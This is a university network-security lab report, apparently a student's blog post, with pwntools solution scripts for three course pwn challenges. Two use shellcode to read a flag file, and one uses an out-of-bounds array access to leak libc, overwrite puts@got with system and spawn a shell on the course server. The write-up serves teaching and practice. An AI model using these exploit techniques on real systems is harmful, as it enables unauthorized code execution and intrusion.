@@ -1,0 +1,318 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>241220106_pwn | YamaBlog</title><meta name="author" content="Yama-lei"><meta name="copyright" content="Yama-lei"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="网络攻防实战实验报告   Pwn实验   学生: &nbsp;&nbsp;雷业成 (241220106)     南京大学计算机科学与技术系 邮箱: 241220106@smail.nju.edu.cn   2025 11 18   最得最终分情况：   Exp1 题目一 截图 flag为：flag{https:&#x2F;&#x2F;www.bilibili.com&#x2F;video&#x2F;BV1BAX6YmE6o?n&#x3D;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="241220106_pwn">
+<meta property="og:url" content="https://yama-lei.top/posts/27ccea6ad88a/index.html">
+<meta property="og:site_name" content="YamaBlog">
+<meta property="og:description" content="网络攻防实战实验报告   Pwn实验   学生: &nbsp;&nbsp;雷业成 (241220106)     南京大学计算机科学与技术系 邮箱: 241220106@smail.nju.edu.cn   2025 11 18   最得最终分情况：   Exp1 题目一 截图 flag为：flag{https:&#x2F;&#x2F;www.bilibili.com&#x2F;video&#x2F;BV1BAX6YmE6o?n&#x3D;">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://yamapicgo.oss-cn-nanjing.aliyuncs.com/picgoImage/yama.webp">
+<meta property="article:published_time" content="2025-11-11T09:21:38.000Z">
+<meta property="article:modified_time" content="2025-11-18T13:52:00.000Z">
+<meta property="article:author" content="Yama-lei">
+<meta property="article:tag" content="博客">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://yamapicgo.oss-cn-nanjing.aliyuncs.com/picgoImage/yama.webp"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "241220106_pwn",
+  "url": "https://yama-lei.top/posts/27ccea6ad88a/",
+  "image": "https://yamapicgo.oss-cn-nanjing.aliyuncs.com/picgoImage/yama.webp",
+  "datePublished": "2025-11-11T09:21:38.000Z",
+  "dateModified": "2025-11-18T13:52:00.000Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Yama-lei",
+      "url": "https://yama-lei.top"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://yama-lei.top/posts/27ccea6ad88a/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          const mediaQueryDark = window.matchMedia('(prefers-color-scheme: dark)')
+          const mediaQueryLight = window.matchMedia('(prefers-color-scheme: light)')
+
+          if (theme === undefined) {
+            if (mediaQueryLight.matches) activateLightMode()
+            else if (mediaQueryDark.matches) activateDarkMode()
+            else {
+              const hour = new Date().getHours()
+              const isNight = hour <= 6 || hour >= 18
+              isNight ? activateDarkMode() : activateLightMode()
+            }
+            mediaQueryDark.addEventListener('change', () => {
+              if (saveToLocal.get('theme') === undefined) {
+                e.matches ? activateDarkMode() : activateLightMode()
+              }
+            })
+          } else {
+            theme === 'light' ? activateLightMode() : activateDarkMode()
+          }
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.json","preload":true,"top_n_per_article":1,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'medium_zoom',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: true,
+  isAnchor: true,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '241220106_pwn',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><link rel="stylesheet" href="/css/var.css"><link rel="stylesheet" href="/css/dark-mode.css"><link rel="stylesheet" href="/css/callout_blocks.css"><link rel="stylesheet" href="/css/custom.css"><link rel="stylesheet" href="/css/homepage-hero.css"><link rel="stylesheet" href="/css/navbar-enhance.css"><link rel="stylesheet" href="/css/page-headers.css"><link rel="stylesheet" href="/css/post-enhance.css"><link rel="stylesheet" href="/css/reading-enhance.css"><link rel="stylesheet" href="/css/code-enhance.css"><link rel="stylesheet" href="/css/code-block-redesign.css"><link rel="stylesheet" href="/css/card-enhance.css"><link rel="stylesheet" href="/css/sidebar-enhance.css"><link rel="stylesheet" href="/css/category-tag-page.css"><link rel="stylesheet" href="/css/archive-timeline.css"><link rel="stylesheet" href="/css/footer-redesign.css"><meta name="generator" content="Hexo 8.0.0"><link rel="alternate" href="/atom.xml" title="YamaBlog" type="application/atom+xml">
+</head><body><div id="web_bg" style="background-color: #ffffff;"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/%E5%9B%BE%E7%89%87%E6%AD%A3%E5%9C%A8%E5%8A%A0%E8%BD%BD%E4%B8%AD..." data-lazy-src="https://yamapicgo.oss-cn-nanjing.aliyuncs.com/picgoImage/yama.webp" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">146</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">11</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">21</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-list"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/playground/"><i class="fa-fw fas fa-flask"></i><span> Playground</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fas fa-user-friends"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/rss/"><i class="fa-fw fas fa-rss-square"></i><span> 朋友圈</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">YamaBlog</span></a><a class="nav-page-title" href="/"><span class="site-name">241220106_pwn</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-list"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/playground/"><i class="fa-fw fas fa-flask"></i><span> Playground</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fas fa-user-friends"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/rss/"><i class="fa-fw fas fa-rss-square"></i><span> 朋友圈</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">241220106_pwn</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-11-11T09:21:38.000Z" title="发表于 2025-11-11 17:21:38">2025-11-11</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-11-18T13:52:00.000Z" title="更新于 2025-11-18 21:52:00">2025-11-18</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/NJUCS/">NJUCS</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/NJUCS/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98/">网络攻防实战</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">1.7k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>7分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><div style="font-family: Georgia, serif; text-align: center; max-width: 600px; margin: 0 auto; padding: 40px 20px; line-height: 1.6; color: #111;">
+  <h1 style="font-size: 2.8rem; font-weight: 700; margin: 10px 0;">网络攻防实战实验报告</h1>
+  <p style="font-size: 1.2rem; color: #333; margin: 15px 0;">Pwn实验</p>
+  <p style="font-size: 1.4rem; margin: 0;">学生: &nbsp;&nbsp;雷业成 (241220106) </p>
+  <p style="font-size: 0.9rem; margin: 5px 0 15px;"> 南京大学计算机科学与技术系</p>
+<p style="font-size: 0.9rem; margin: 5px 0 15px;">邮箱: 241220106@smail.nju.edu.cn</p>
+  <p style="font-size: 1.3rem;  font-weight: bold; margin: 0;">2025 11 18</p>
+</div>
+<h2 id="最得最终分情况"><a class="markdownIt-Anchor" href="#最得最终分情况"></a> 最得最终分情况：</h2>
+<p><img src="/%E5%9B%BE%E7%89%87%E6%AD%A3%E5%9C%A8%E5%8A%A0%E8%BD%BD%E4%B8%AD..." data-lazy-src="https://yamapicgo.oss-cn-nanjing.aliyuncs.com/picgoImage/20251118214941.png" alt="image.png" /></p>
+<h2 id="exp1-题目一"><a class="markdownIt-Anchor" href="#exp1-题目一"></a> Exp1 题目一</h2>
+<p><strong>截图</strong>
+<img src="/%E5%9B%BE%E7%89%87%E6%AD%A3%E5%9C%A8%E5%8A%A0%E8%BD%BD%E4%B8%AD..." data-lazy-src="https://yamapicgo.oss-cn-nanjing.aliyuncs.com/picgoImage/20251111174435.png" alt="image.png" />flag为：<code>flag{https://www.bilibili.com/video/BV1BAX6YmE6o?n=8064c8b8}</code>
+<strong>解题脚本</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># p = process(&quot;./chall1&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;210.28.132.84&quot;</span>, <span class="number">9001</span>) <span class="comment"># 假设题目部署在独立端口</span></span><br><span class="line">shellcode = asm(</span><br><span class="line">    shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>) +</span><br><span class="line">    shellcraft.read(<span class="string">&#x27;rax&#x27;</span>,<span class="string">&#x27;rsp&#x27;</span>,<span class="number">128</span>) +</span><br><span class="line">    shellcraft.write(<span class="number">1</span>,<span class="string">&#x27;rsp&#x27;</span>,<span class="number">128</span>) <span class="comment"># if write 1 &#x27;rsp&#x27; &#x27;rax&#x27; what would happen</span></span><br><span class="line">)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;bytes):\n&quot;</span>)</span><br><span class="line">p.send(shellcode)</span><br><span class="line">p.recvline()</span><br><span class="line">flag = p.recvall(timeout=<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">b&quot;Flag: &quot;</span> + flag.strip())</span><br></pre></td></tr></table></figure>
+<p><strong>脚本解释</strong>
+open函数打开&quot;/flag&quot;文件，然后文件描述符fd存在了rax寄存器中。</p>
+<ul>
+<li>open函数参数：文件地址
+read函数从文件描述符中读取最多128个字节存在栈顶rsp，返回值在eax中（表示的是读取的长度）</li>
+<li>read参数为：fd，缓冲区地址，读取字节数
+write函数把rsp上面的内容写入1（打印，标准输出），打印长度为rax。</li>
+<li>write参数：fd, 输出的缓冲区地址，打印字节数</li>
+</ul>
+<blockquote>
+<p>为什么不用rsp减去一段长度来预留空间？因为程序的控制权完全被我们占用了</p>
+</blockquote>
+<h3 id="手搓shellcode"><a class="markdownIt-Anchor" href="#手搓shellcode"></a> 手搓shellcode：</h3>
+<ol>
+<li>首先需要用汇编将字符串写入栈中。<br />
+要写入字符串 \/flag&quot;，需依次写入字节 <code>\x2f\x66\x6c\x61\x67\x00</code>，对应的64位整数为 <code>0x67616c662f</code>。只需执行以下指令即可将该字符串压入栈中：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov rax, 0x67616c662f</span><br><span class="line">push rax</span><br></pre></td></tr></table></figure>
+</li>
+<li>接着调用 <code>open</code>、<code>read</code> 和 <code>write</code> 系统调用：分别准备好各函数所需的参数，设置 <code>rax</code> 为对应系统调用号，然后执行 <code>syscall</code>。
+我最初写的shellcode为：</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">shellcode = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    mov rax,0x67616c662f</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rdi,rsp</span></span><br><span class="line"><span class="string">    mov rsi,0</span></span><br><span class="line"><span class="string">    mov rax, 2</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">)</span><br><span class="line">shellcode+=asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    mov rdi, rax</span></span><br><span class="line"><span class="string">    mov rsi,rsp</span></span><br><span class="line"><span class="string">    mov rdx, 128</span></span><br><span class="line"><span class="string">    mov rax,0</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">shellcode+=asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    mov edi, 1</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    mov rdx, rax</span></span><br><span class="line"><span class="string">    mov rax, 1</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>
+<p>但是出现了段错误segment_fault。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[*] Process &#x27;./chall1&#x27; stopped with exit code -11 (SIGSEGV) (pid 152858)</span><br><span class="line">[+] Receiving all data: Done (0B)</span><br><span class="line">b&#x27;Flag: &#x27;           </span><br></pre></td></tr></table></figure>
+<p>尝试下载pwndbg插件并用gdb进行调试，无果。</p>
+<p>最后突然想明白了，我本地压根没有flag这个文件…换成云端之后就成功了：<img src="/%E5%9B%BE%E7%89%87%E6%AD%A3%E5%9C%A8%E5%8A%A0%E8%BD%BD%E4%B8%AD..." data-lazy-src="https://yamapicgo.oss-cn-nanjing.aliyuncs.com/picgoImage/image-20251118214104404.png" alt="image-20251118214104404" /></p>
+<p><strong>手搓的shellcode</strong></p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">shellcode = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    mov rax,0x67616c662f</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rdi,rsp</span></span><br><span class="line"><span class="string">    mov rsi,0</span></span><br><span class="line"><span class="string">    mov rax, 2</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">)</span><br><span class="line">shellcode+=asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    mov rdi, rax</span></span><br><span class="line"><span class="string">    mov rsi,rsp</span></span><br><span class="line"><span class="string">    mov rdx, 128</span></span><br><span class="line"><span class="string">    mov rax,0</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">shellcode+=asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    mov rdi, 1</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    mov rdx, rax</span></span><br><span class="line"><span class="string">    mov rax, 1</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>
+<h2 id="exp2-题目2"><a class="markdownIt-Anchor" href="#exp2-题目2"></a> Exp2 题目2</h2>
+<p>截图
+<img src="/%E5%9B%BE%E7%89%87%E6%AD%A3%E5%9C%A8%E5%8A%A0%E8%BD%BD%E4%B8%AD..." data-lazy-src="https://yamapicgo.oss-cn-nanjing.aliyuncs.com/picgoImage/20251111190952.png" alt="image.png" />
+flag为<code>flag{https://www.bilibili.com/video/BV1u4411z7oe?n=e0af476c}</code></p>
+<p>脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#p = process(&quot;./chall2&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;210.28.132.84&quot;</span>, <span class="number">9002</span>) <span class="comment"># 假设题目部署在独立端口</span></span><br><span class="line">shellcode = asm(</span><br><span class="line">shellcraft.openat(<span class="string">&#x27;AT_FDCWD&#x27;</span>, <span class="string">&#x27;flag&#x27;</span>, <span class="number">0</span>) +</span><br><span class="line">shellcraft.read(<span class="string">&#x27;rax&#x27;</span>, <span class="string">&#x27;rsp&#x27;</span>, <span class="number">1024</span>) +</span><br><span class="line">shellcraft.write(<span class="number">1</span>, <span class="string">&#x27;rsp&#x27;</span>, <span class="string">&#x27;rax&#x27;</span>)</span><br><span class="line">)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;bytes):\n&quot;</span>)</span><br><span class="line">p.send(shellcode)</span><br><span class="line">p.recvline()</span><br><span class="line">flag = p.recvall(timeout=<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">b&quot;Flag: &quot;</span> + flag.strip())</span><br></pre></td></tr></table></figure>
+<p><strong>脚本解释</strong>
+openat函数在当前目录打开&quot;flag&quot;文件，fd存在rax。
+openat参数：AT_FDCWD（当前的工作目录），文件路径（参数为“flag”），flags（0表示只读） read函数从rax(fd)读取最多1024字节到rsp栈顶，读取长度存eax。
+read参数：fd，缓冲区地址，读取字节数 write函数把rsp内容输出到标准输出，打印长度为eax。
+write参数：fd=1，rsp为输出缓冲区地址，rax为打印字节数</p>
+<h2 id="exp3实验三"><a class="markdownIt-Anchor" href="#exp3实验三"></a> Exp3实验三</h2>
+<p><img src="/%E5%9B%BE%E7%89%87%E6%AD%A3%E5%9C%A8%E5%8A%A0%E8%BD%BD%E4%B8%AD..." data-lazy-src="https://yamapicgo.oss-cn-nanjing.aliyuncs.com/picgoImage/20251111191727.png" alt="image.png" />
+flag为<code>flag{https://www.bilibili.com/video/BV1TM4y157UF?n=15aae955 }</code>
+<strong>脚本</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;210.28.132.84&quot;</span>, <span class="number">9003</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line">e = ELF(<span class="string">&quot;./chall3&quot;</span>)</span><br><span class="line"><span class="comment"># 计算notes数组到puts@got的偏移</span></span><br><span class="line">offset_to_puts_got = (e.got[<span class="string">&#x27;puts&#x27;</span>] - e.symbols[<span class="string">&#x27;notes&#x27;</span>]) // <span class="number">8</span></span><br><span class="line">log.info(<span class="string">f&quot;Offset from notes array to puts@got: <span class="subst">&#123;offset_to_puts_got&#125;</span>&quot;</span>)</span><br><span class="line"><span class="comment"># 泄露puts函数真实地址</span></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;&gt;&gt; &quot;</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Index: &quot;</span>, <span class="built_in">str</span>(offset_to_puts_got).encode())</span><br><span class="line">p.recvuntil(<span class="string">b&quot; = &quot;</span>)</span><br><span class="line">leaked_puts_addr = <span class="built_in">int</span>(p.recvline().strip())</span><br><span class="line">log.success(<span class="string">f&quot;Leaked puts() address: <span class="subst">&#123;<span class="built_in">hex</span>(leaked_puts_addr)&#125;</span>&quot;</span>)</span><br><span class="line"><span class="comment"># 计算libc基址</span></span><br><span class="line">libc_base = leaked_puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log.info(<span class="string">f&quot;Calculated libc base address: <span class="subst">&#123;<span class="built_in">hex</span>(libc_base)&#125;</span>&quot;</span>)</span><br><span class="line"><span class="comment"># 计算system地址</span></span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.success(<span class="string">f&quot;Calculated system() address: <span class="subst">&#123;<span class="built_in">hex</span>(system_addr)&#125;</span>&quot;</span>)</span><br><span class="line"><span class="comment"># 劫持puts@got为system地址</span></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;&gt;&gt; &quot;</span>, <span class="string">b&quot;2&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Index: &quot;</span>, <span class="built_in">str</span>(offset_to_puts_got).encode())</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Value: &quot;</span>, <span class="built_in">str</span>(system_addr).encode())</span><br><span class="line">log.info(<span class="string">&quot;Overwrote puts@got with system address.&quot;</span>)</span><br><span class="line"><span class="comment"># 触发system(&quot;sh&quot;)</span></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;&gt;&gt; &quot;</span>, <span class="string">b&quot;4&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>利用数组越界读写实现GOT劫持四步操作：</p>
+<ul>
+<li>第一步：计算偏移。notes数组在bss段，puts@got在got.plt段，两者相距固定。<code>(e.got['puts'] - e.symbols['notes']) </code> 算出数组下标的offset（之后使用数组越界来访问puts数组的地址），用读功能泄露puts运行时地址</li>
+<li>第二步：计算libc基址。puts运行时地址减去libc文件中puts的偏移量：<code>leaked_puts_addr - libc.symbols['puts']</code>，得到libc加载基址</li>
+<li>第三步：计算system地址。基址加上system在libc中的偏移：<code>libc_base + libc.symbols['system']</code>，得到system真实地址</li>
+<li>第四步：劫持与触发。用写功能将puts@got覆写为system地址，再调用菜单的Secret功能执行puts(\sh&quot;)，实际变成system(\sh&quot;)拿shell</li>
+</ul>
+<blockquote>
+<p>即：根据偏移量来获取到地址，然后执行sh程序获得shell</p>
+</blockquote>
